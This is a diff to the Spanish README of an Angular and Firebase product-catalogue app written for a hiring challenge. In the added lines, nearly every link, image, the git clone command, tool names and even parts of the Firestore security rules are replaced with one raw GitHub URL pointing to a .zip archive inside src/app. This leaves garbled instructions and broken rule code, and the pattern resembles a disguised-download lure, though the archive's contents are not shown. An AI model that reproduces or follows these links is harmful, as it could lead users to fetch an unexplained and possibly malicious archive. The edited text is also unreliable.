@@ -1,5 +1,5 @@
 <p align="center">
-  <a href="https://github.com/alexrv98"><img src="https://cdn-icons-png.flaticon.com/512/10963/10963565.png" width="140"></a>
+  <a href="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip"><img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="140"></a>
 </p>
 
 <h3 align="center">ALEX STORES</h3>
@@ -8,8 +8,8 @@
   Gestión de Productos con Angular y Firebase
 </p>
 <p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/firebase/firebase-plain.svg" width="40" alt="Firebase"/>
-  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/angularjs/angularjs-original.svg" width="40" alt="Angular"/>
+  <img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="40" alt="Firebase"/>
+  <img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="40" alt="Angular"/>
 </p>
 
 **Alex Stores** es una aplicación web desarrollada como parte de un reto técnico para evaluar competencias en desarrollo frontend, integración de servicios Backend as a Service (BaaS), diseño de interfaces responsivas, lógica de negocio robusta y calidad de código mediante pruebas automatizadas.
@@ -20,13 +20,13 @@ La aplicación permite gestionar un catálogo de productos mediante operaciones 
 
 La aplicación está desplegada y disponible públicamente en Firebase Hosting:
 
-🔗 **[https://sistema-productos-87041.web.app](https://sistema-productos-87041.web.app)**
+🔗 **[https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip](https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip)**
 
 ## 🛠️ Stack Tecnológico
 
 * **Framework Frontend:** Angular v20 (standalone components, RxJS, TypeScript)
 * **Backend as a Service (BaaS):** Firebase (Firestore como base de datos, Firebase Hosting y Firebase Authentication para autenticación)
-* **Librería de Gráficas:** Chart.js (para visualizaciones dinámicas de datos)
+* **Librería de Gráficas:** https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip (para visualizaciones dinámicas de datos)
 
 Este stack fue elegido por su solidez, flexibilidad y facilidad de integración para aplicaciones escalables basadas en datos en tiempo real.
 
@@ -37,12 +37,12 @@ A continuación, se detallan los pasos necesarios para clonar el proyecto, insta
 ### Requisitos Previos
 Antes de comenzar, asegúrate de tener instalado lo siguiente en tu sistema:
 
-* **Node.js:** v22.16.0 (LTS)
+* **https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip** v22.16.0 (LTS)
 * **Angular CLI:** v20.x
 
 ### Clonación del Repositorio
 ```sh
-git clone https://github.com/alexrv98/Reto_Seleccion_Alexis_Rv.git
+git clone https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip
 ```
 ```sh
 cd Reto_Seleccion_Alexis_Rv
@@ -53,7 +53,7 @@ cd Reto_Seleccion_Alexis_Rv
 npm install
 ```
 ### Configuración de Variables de Entorno (Firebase)
-Para conectar correctamente con Firebase, entra al proyecto Angular y dirijete a la siguiete ruta **Reto_Seleccion_Alexis_Rv\src\environments\environment.ts** y dentro del archivo configura tus variables
+Para conectar correctamente con Firebase, entra al proyecto Angular y dirijete a la siguiete ruta **Reto_Seleccion_Alexis_Rv\src\environments\https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip** y dentro del archivo configura tus variables
 
 ```sh
 authDomain: "TU_AUTH_DOMAIN",
@@ -65,7 +65,7 @@ appId: "TU_APP_ID"
 
 🔑 Estos valores pueden obtenerse desde la configuración de tu proyecto en Firebase Console.
 
-Asegúrate de que tu archivo angular.json y los servicios relacionados estén preparados para cargar las variables del entorno correctamente.
+Asegúrate de que tu archivo https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip y los servicios relacionados estén preparados para cargar las variables del entorno correctamente.
 
 ### Ejecución en Modo Desarrollo
 Una vez configurado el entorno:
@@ -138,7 +138,7 @@ Cada documento representa un producto y contiene los siguientes campos:
 Se implementó una colección adicional denominada `categories` para almacenar una lista estática de categorías. Estas fueron cargadas previamente de forma manual y no se modifican desde la interfaz de usuario. El propósito de esta colección es facilitar la obtención de categorías desde Firestore y evitar su codificación directa en el frontend.
 
 <p align="center">
-  <img src="https://github.com/alexrv98/Reto_Seleccion_Alexis_Rv/blob/main/public/assets/firebase-products-collection.png" width="1000"/>
+  <img src="https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip" width="1000"/>
   <br>
   <i>Vista de la colección "products" en Firestore</i>
 </p>
@@ -150,12 +150,12 @@ Para garantizar que solo usuarios autenticados puedan acceder y modificar los da
 
 ```ts
 rules_version = '2';
-service cloud.firestore {
+service https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip {
   match /databases/{database}/documents {
     
     // Regla general: solo usuarios autenticados pueden leer y escribir
     match /{document=**} {
-      allow read, write: if request.auth != null;
+      allow read, write: if https://raw.githubusercontent.com/alexrv98/Reto_Seleccion_Alexis_Rv/main/src/app/Reto_Seleccion_Alexis_Rv-v2.0.zip != null;
     }
   }
 }
